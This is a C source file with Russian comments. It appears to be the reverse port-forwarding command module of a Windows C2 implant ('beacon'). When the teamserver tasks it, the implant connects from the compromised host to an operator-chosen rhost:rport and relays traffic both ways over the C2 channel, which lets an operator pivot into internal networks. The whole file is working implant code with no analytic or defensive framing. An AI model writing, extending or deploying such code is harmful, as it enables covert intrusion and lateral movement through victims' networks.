// cmd_rportfwd.c — обратный проброс порта через C2-канал (Reverse Port Forward).
//
// Архитектура:
//   Teamserver открывает TCP-порт (lport). Когда клиент подключается к нему,
//   сервер генерирует conn_id и задаёт биконe команду OP_RPORTFWD_OPEN.
//   Бикон подключается к rhost:rport и сигнализирует об успехе/ошибке через
//   RPORTFWD_TASK_MAGIC. Данные в обе стороны передаются как:
//       server → beacon: OP_RPORTFWD_DATA задачи
//       beacon → server: RPORTFWD_TASK_MAGIC out-of-band кадры
//
// Формат RPORTFWD_TASK_MAGIC кадров (идентичен SOCKS):
//   [u64 conn_id BE][u8 type][optional payload]
//   0x01 = CONNECT_OK
//   0x02 = CONNECT_FAIL
//   0x03 = DATA: [u32 len BE][bytes]
//   0x04 = CLOSE
//
// Максимальное число одновременных соединений: 16 (расширяемо).

#include <winsock2.h>
#include <ws2tcpip.h>
#include "../core/beacon.h"

// ---- константы -----------------------------------------------------------

#define MAX_RPORTFWD_CONNS 16
#define RPORTFWD_BUF_SIZE  32768

#define RMSG_CONNECT_OK   0x01
#define RMSG_CONNECT_FAIL 0x02
#define RMSG_DATA         0x03
#define RMSG_CLOSE        0x04

// ---- таблица активных соединений -----------------------------------------

typedef struct {
    volatile LONG active;
    uint64_t      conn_id;
    SOCKET        sock;
} RpfConn;

static RpfConn g_rpf[MAX_RPORTFWD_CONNS];
static LONG    g_rpf_inited = 0;
static LONG    g_wsa_inited = 0;   // общий флаг, может уже быть выставлен SOCKS

// ---- инициализация -------------------------------------------------------

static void rpf_init(void) {
    if (InterlockedCompareExchange(&g_rpf_inited, 1, 0) == 0) {
        for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
            g_rpf[i].active  = 0;
            g_rpf[i].conn_id = 0;
            g_rpf[i].sock    = INVALID_SOCKET;
        }
    }
    if (InterlockedCompareExchange(&g_wsa_inited, 1, 0) == 0) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
    }
}

// ---- вспомогательные функции ---------------------------------------------

static int rpf_find(uint64_t conn_id) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++)
        if (g_rpf[i].active && g_rpf[i].conn_id == conn_id) return i;
    return -1;
}

static int rpf_alloc(uint64_t conn_id) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
        if (InterlockedCompareExchange(&g_rpf[i].active, 1, 0) == 0) {
            g_rpf[i].conn_id = conn_id;
            g_rpf[i].sock    = INVALID_SOCKET;
            return i;
        }
    }
    return -1;
}

static void rpf_free(int slot) {
    if (g_rpf[slot].sock != INVALID_SOCKET) {
        closesocket(g_rpf[slot].sock);
        g_rpf[slot].sock = INVALID_SOCKET;
    }
    g_rpf[slot].conn_id = 0;
    InterlockedExchange(&g_rpf[slot].active, 0);
}

// Целое в строку без CRT (для getaddrinfo port).
static void rpf_u32_str(uint32_t v, char* out) {
    char tmp[12]; int n = 0;
    if (!v) { out[0] = '0'; out[1] = '\0'; return; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0;
    while (n) out[i++] = tmp[--n];
    out[i] = '\0';
}

// Отправка RPORTFWD out-of-band сообщения через transport_direct_send.
static void rpf_send(const TransportVtbl* tv, uint64_t conn_id,
                     uint8_t type, const uint8_t* data, uint32_t dlen) {
    uint32_t extra = (type == RMSG_DATA && data && dlen) ? (4u + dlen) : 0u;
    uint32_t total = 9u + extra;   // 8(conn_id) + 1(type) + extra
    uint8_t* buf   = (uint8_t*)bmalloc(total);
    if (!buf) return;

    buf[0] = (uint8_t)(conn_id >> 56); buf[1] = (uint8_t)(conn_id >> 48);
    buf[2] = (uint8_t)(conn_id >> 40); buf[3] = (uint8_t)(conn_id >> 32);
    buf[4] = (uint8_t)(conn_id >> 24); buf[5] = (uint8_t)(conn_id >> 16);
    buf[6] = (uint8_t)(conn_id >>  8); buf[7] = (uint8_t)(conn_id);
    buf[8] = type;
    if (extra) {
        buf[9]  = (uint8_t)(dlen >> 24);
        buf[10] = (uint8_t)(dlen >> 16);
        buf[11] = (uint8_t)(dlen >>  8);
        buf[12] = (uint8_t)(dlen);
        rt_memcpy(buf + 13, data, dlen);
    }
    transport_direct_send(tv, RPORTFWD_TASK_MAGIC, buf, total);
    bfree(buf);
}

// ---- Обработчики команд --------------------------------------------------

// OP_RPORTFWD_OPEN: подключиться к rhost:rport.
void cmd_rportfwd_open(const BeaconTask* t) {
    rpf_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    char     rhost[256] = {0};
    uint32_t rport = 0;

    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);
    kv_get_str(t->pay, t->pay_len, "rhost",   rhost, sizeof(rhost));
    kv_get_u32(t->pay, t->pay_len, "rport",   &rport);

    if (!rhost[0] || !rport) {
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    int slot = rpf_alloc(conn_id);
    if (slot < 0) {
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    // Резолвинг и подключение к rhost:rport.
    char portstr[8] = {0};
    rpf_u32_str(rport, portstr);

    struct addrinfo hints, *res = NULL;
    rt_memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family   = AF_UNSPEC;

    if (getaddrinfo(rhost, portstr, &hints, &res) != 0 || !res) {
        rpf_free(slot);
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    SOCKET s = socket(res->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        freeaddrinfo(res);
        rpf_free(slot);
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    // Неблокирующий connect с таймаутом 10 с через select().
    u_long mode = 1;
    ioctlsocket(s, FIONBIO, &mode);

    connect(s, res->ai_addr, (int)res->ai_addrlen);
    freeaddrinfo(res);

    fd_set wfds;
    FD_ZERO(&wfds);
    FD_SET(s, &wfds);
    struct timeval tv_timeout = {10, 0};
    int sel = select(0, NULL, &wfds, NULL, &tv_timeout);

    if (sel <= 0) {
        closesocket(s);
        rpf_free(slot);
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    // Возвращаем в блокирующий режим.
    mode = 0;
    ioctlsocket(s, FIONBIO, &mode);

    g_rpf[slot].sock = s;
    rpf_send(tv, conn_id, RMSG_CONNECT_OK, NULL, 0);
}

// OP_RPORTFWD_DATA: переслать данные в сокет.
void cmd_rportfwd_data(const BeaconTask* t) {
    rpf_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);

    const uint8_t* data = NULL;
    uint32_t       dlen = 0;
    kv_find(t->pay, t->pay_len, "data", &data, &dlen);

    int slot = rpf_find(conn_id);
    if (slot < 0) {
        rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
        return;
    }

    if (data && dlen) {
        int sent = send(g_rpf[slot].sock, (const char*)data, (int)dlen, 0);
        if (sent == SOCKET_ERROR) {
            rpf_free(slot);
            rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
            return;
        }
    }

    // Читаем немедленный ответ от сервера, если он есть.
    u_long avail = 0;
    if (ioctlsocket(g_rpf[slot].sock, FIONREAD, &avail) == 0 && avail > 0) {
        uint32_t cap = avail > RPORTFWD_BUF_SIZE ? RPORTFWD_BUF_SIZE : avail;
        uint8_t* rbuf = (uint8_t*)bmalloc(cap);
        if (rbuf) {
            int n = recv(g_rpf[slot].sock, (char*)rbuf, (int)cap, 0);
            if (n > 0) {
                rpf_send(tv, conn_id, RMSG_DATA, rbuf, (uint32_t)n);
            } else if (n == 0 || n == SOCKET_ERROR) {
                bfree(rbuf);
                rpf_free(slot);
                rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
                return;
            }
            bfree(rbuf);
        }
    }
}

// OP_RPORTFWD_CLOSE: закрыть соединение.
void cmd_rportfwd_close(const BeaconTask* t) {
    rpf_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);

    int slot = rpf_find(conn_id);
    if (slot >= 0) {
        rpf_free(slot);
    }
    rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
}

// ---- rportfwd_flush_pending (вызывается из main loop) --------------------
// Аналог socks_flush_pending: опрашивает все активные rportfwd-соединения
// и отправляет накопившиеся данные от целевого сервера обратно на teamserver.
void rportfwd_flush_pending(const TransportVtbl* tv) {
    if (!g_rpf_inited) return;

    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
        if (!g_rpf[i].active) continue;
        SOCKET s = g_rpf[i].sock;
        if (s == INVALID_SOCKET) continue;

        u_long avail = 0;
        if (ioctlsocket(s, FIONREAD, &avail) != 0 || avail == 0) continue;

        uint32_t cap = avail > RPORTFWD_BUF_SIZE ? RPORTFWD_BUF_SIZE : avail;
        uint8_t* rbuf = (uint8_t*)bmalloc(cap);
        if (!rbuf) continue;

        int n = recv(s, (char*)rbuf, (int)cap, 0);
        if (n > 0) {
            rpf_send(tv, g_rpf[i].conn_id, RMSG_DATA, rbuf, (uint32_t)n);
        } else {
            // Сокет закрыт удалённой стороной.
            bfree(rbuf);
            uint64_t cid = g_rpf[i].conn_id;
            rpf_free(i);
            rpf_send(tv, cid, RMSG_CLOSE, NULL, 0);
            continue;
        }
        bfree(rbuf);
    }
}
